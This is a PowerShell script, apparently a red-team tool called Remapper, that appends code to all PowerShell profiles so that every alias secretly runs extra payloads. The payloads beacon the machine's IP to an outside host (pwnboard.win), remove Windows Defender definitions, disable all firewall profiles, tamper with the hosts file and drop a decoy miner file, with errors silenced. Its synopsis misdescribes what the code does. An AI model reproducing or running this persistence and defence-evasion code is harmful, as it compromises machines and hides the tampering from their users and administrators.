<#
    .SYNOPSIS
    Script which can be used to find living off the land binaries and scripts on a target machine.
    .DESCRIPTION
    Remapper aims to leverage alias shimming and PowerShell profiles
    to shim every alias with user defined funtions and have the aliases still function normally as to not
    raise suspicions.
    .PARAMETER Outfile
    If specified output will be put into an outfile of this name
    .NOTES
    Version:        1.0
    Author:         NotoriousRebel
    Creation Date:  10/28/19
    .EXAMPLE
    PS C:\> .\remap.ps1
    .LINK
    https://github.com/NotoriousRebel/Remapper
    #>

# DEFINE FUNCTIONS BELOW
$mm = @'
function mm {try {$i=Test-Connection -ComputerName (hostname) -Count 1|Select-Object -ExpandProperty IPV4Address;$i=$i.IPAddressToString;$p=@{"ip"=$i;"type"="Alias_Shim"}|ConvertTo-Json;Invoke-WebRequest "http://pwnboard.win/generic" -Method Post -UseBasicParsing -Body $p -ContentType "application/json"|Out-Null}Catch{}}
'@.Trim()
$gg = @'
function gg {$g=[Guid]::newGuid().Guid.Replace("-", "").substring(0,10) + "miner.ps1";New-Item -Path (Join-Path $env:USERPROFILE 'Desktop') -Force -Name $g | Out-Null;}
'@.Trim()
$dd = @'
function dd {try{Invoke-Expression("'C:\Program Files\Windows Defender\MpCmdRun.exe' -RemoveDefinitions -All Set-MpPreference -DisableIOAVProtection $true") -ErrorAction SilentlyContinue | Out-Null}Catch{}}
'@.Trim()
$ff = @'
function ff {try{Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -ErrorAction SilentlyContinue | Out-Null}Catch{}}
'@.Trim()
$xx = @'
function xx {try{$x=$false;Get-Content "C:\Windows\System32\drivers\etc\hosts" -ErrorAction SilentlyContinue |ForEach-Object {if($_ -match "google.com"){$x = $true}};if($x -eq $false){try{Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -ErrorAction SilentlyContinue -Value "`r`n0.0.0.0    www.google.com google.com" | Out-Null}Catch{}}}Catch{}}
'@.Trim()

$orig_dct = @{ }
function create_map() {
    <#
    .SYNOPSIS
    A helper function that creates a hashmap
    .DESCRIPTION
    Given the name of the alias will retrive the definition of the alias
    and create a new entry in the hashmap with the 
    key being the alias and the value being the definition
    .PARAMETER alias
    Name of alias that will serve as key
    #>
    param([parameter(ValueFromPipeline)][string]$alias)
    $value = (Get-Alias -Name $alias).Definition
    $orig_dct[$alias] = $value
}

function shim([string]$key, [string]$value) {
    <#
    .SYNOPSIS
    A helper function that creates a hashmap
    .DESCRIPTION
    Given the name of the alias will retrive the definition of the alias
    and create a new entry in the hashmap with the 
    key being the alias and the value being the definition
    .PARAMETER key
     Name of alias 
    .PARAMETER value
     Definition of alias (key)
    .OUTPUTS
    arr: Array that contains two elements
    First element: String that is definition of function that contains shimmed functions as well as definition for alias
    Second element: String that redefines the alias with the Value being our shimmed functon 
     
    #>
    $y = "function shimmed_$key {{$value; Invoke-Expression('mm; gg; xx; dd; ff')}}"
    $tmp = "shimmed_$key"
    $shim = 'Set-Alias -Name cmd -Value val -Option AllScope,Constant -Scope Global -ErrorAction SilentlyContinue -Force'
    $s = $shim.Replace("cmd", $key).Replace("val", $tmp)
    $arr = @()
    $arr += $y
    $arr += $s
    $arr 
    return $arr
}


function write_to([string]$path, [string]$val) {
    Try {
        Add-Content -Path $path -Value $val
    }
    Catch {

    }
}
function main() {
    Get-Alias | ForEach-Object { $_.Name | create_map }
    #exit 2
    #$cur_user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[1]
    #$env:USERNAME may be modified
    $curuser_allhosts = $PROFILE.CurrentUserAllHosts
    $allusers_allhosts = $PROFILE.AllUsersAllHosts

    if (!(Test-Path -Path $curuser_allhosts)) {
        Try {
            New-Item -ItemType File -Path $curuser_allhosts -ErrorAction SilentlyContinue -Force | Out-Null
        }
        Catch { }
    }
    if (!(Test-Path -Path $allusers_allhosts)) {
        Try {
            New-Item -ItemType File -Path $allusers_allhosts -ErrorAction SilentlyContinue -Force | Out-Null
        }
        Catch { }
    }
    
    Get-Alias | ForEach-Object { $_.Name | create_map }
    $orig_dct["?"] = "Where-Object"
    # Hardcoded because returns 4 different values when doing Get-Alias
    $lst = $orig_dct.Keys | Sort-Object
    # Sort the keys to go in order 
    $all = @()
    foreach ($key in $lst) {
        $val = $orig_dct[$key]
        $arr = shim $key $val
        $alias_line = $arr[0]
        $func_shim = $arr[1]
        $all += $alias_line
        $all += $func_shim
    }
    $all
    #exit 2 
    Try {
        write_to $curuser_allhosts $mm
        write_to $curuser_allhosts $gg
        write_to $curuser_allhosts $dd
        write_to $curuser_allhosts $ff
        write_to $curuser_allhosts $xx
        foreach ($v in $all) {
            write_to $curuser_allhosts $v
        }
    }
    Catch { }

    Try {
        write_to $allusers_allhosts $mm
        write_to $allusers_allhosts $gg
        write_to $allusers_allhosts $dd
        write_to $allusers_allhosts $ff
        write_to $allusers_allhosts $xx
        foreach ($v in $all) {
            write_to $allusers_allhosts $v
        }
    }
    Catch { }
}

main